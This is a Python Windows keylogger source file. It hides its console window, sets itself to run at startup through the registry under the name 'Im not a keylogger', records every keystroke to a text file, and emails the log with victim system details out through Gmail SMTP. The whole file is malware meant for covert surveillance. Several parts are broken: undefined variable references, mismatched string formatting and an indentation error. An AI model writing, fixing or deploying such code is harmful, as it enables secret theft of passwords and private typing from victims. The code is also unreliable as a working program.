import win32api
import win32console
import win32gui
import pythoncom,pyHook
import smtplib
import base64, os, sys, re, string
import sqlite3
import socket
import platform
import uuid
from _winreg import *


class Keylogger(object):
    def __init__(self):
        self.fp = None
        self.file_name = None
        self.new_file_path = None
        self.keyVal = None
        self.key2change = None


        # I/O variables
        self.filename = None
        self.fo = None
        self.f = None


        # Email settings
        # Change these #
        self.sender = 'your_email@gmail.com'
        self.reciever = 'your_email@gmail.com'
        self.password = 'your_password'
        self.message = None


        # Don't change this
        self.marker = "AUNIQUEMARKER"
        self.win=win32console.GetConsoleWindow()
        win32gui.ShowWindow(win,0)


        #Body email
        self.body = """
            New stuff info from victim
            ===========================
            Name: {0}
            FQDN: {1}
            System Platform: {2}
            Machine: {3}
            Node: {4}
            Platform: {5}
            Processor: {6}
            System OS: {7}
            Release: {8}
            Version: {9}
            """.format(socket.gethostname(),
                socket.getfqdn(),
                sys.platform,
                platform.machine(),
                platform.node(),
                platform.platform(),
                platform.processor(),
                platform.system(),
                platform.release(),
                platform.version())

        self.part1 = """
            From: Victim <toxicnull@gmail.com>
            To: Filip <toxicnull@gmail.com>
            Subject: New Info From Keylogger
            MIME-Version: 1.0
            Content-Type: multipart/mixed; boundary={0}
            --{0}
            """.format(self.marker)

        self.part2 = """
            Content-Type: text/plain
            Content-Transfer-Encoding:8bit
            %s
            --%s
            """.format(self.body, self.marker)

        self.part3 = """
            Content-Type: multipart/mixed; name=\"%s\"
            Content-Transfer-Encoding:base64
            Content-Disposition: attachment; filename=%s
            %s
            --%s--
            """.format(filename, filename, encodedcontent, marker)


        # Other settings
        self.points = 0


    # This will add the file to the startup registry key
    def addStartup(self):
        self.fp = os.path.dirname(os.path.realpath(__file__))
        self.file_name = sys.argv[0].split('\\')[-1]
        self.new_file_path = fp + '\\' + file_name
        self.keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        self.key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
                new_file_path)


    def createtxtfile(self):
        open('output.txt','a').close()
        print "Running..."


    def OnKeyboardEvent(self, event):
        #Ctrl-E
        self.points += 1
        print points
        if event.Ascii==5:
            f=open('output.txt','r+')
            f.close()
            os.remove("output.txt")
            sys.exit(0)
        if event.Ascii !=0 or 8:
            f=open('output.txt','r+')
            buffer=f.read()
            f.close()
            f=open('output.txt','w+')
            keylogs=chr(event.Ascii)
            # if press ENTER 
            if event.Ascii==13:
                keylogs='\n'  
            if event.Ascii==32:
                keylogs=' '
            buffer+=keylogs
            f.write(buffer)
            f.close()
        if points == 100: ## how may letters typed
            points = 0
            filename = "output.txt"
            fo = open(filename, "rb")
            filecontent = fo.read()
            encodedcontent = base64.b64encode(filecontent)

    def messagecompose(self):
         self.message = self.part1 + self.part2 + self.part3
        
        try:
           fo.close()
           f.close()
           smtpObj = smtplib.SMTP('smtp.gmail.com:587')
           smtpObj.starttls()
           smtpObj.login(sender, password)
           smtpObj.sendmail(sender, reciever, message)
           print "Success"
           os.remove("output.txt")
           f = open('output.txt','w+')
           f.close()
        except Exception as e:
           print "Error: {}".format(e)


# Main
if __name__ == '__main__':
    obj = Keylogger()
    obj.addStartup()
    hm = pyHook.HookManager()
    hm.KeyDown = obj.OnKeyboardEvent()
    hm.HookKeyboard()
    pythoncom.PumpMessages()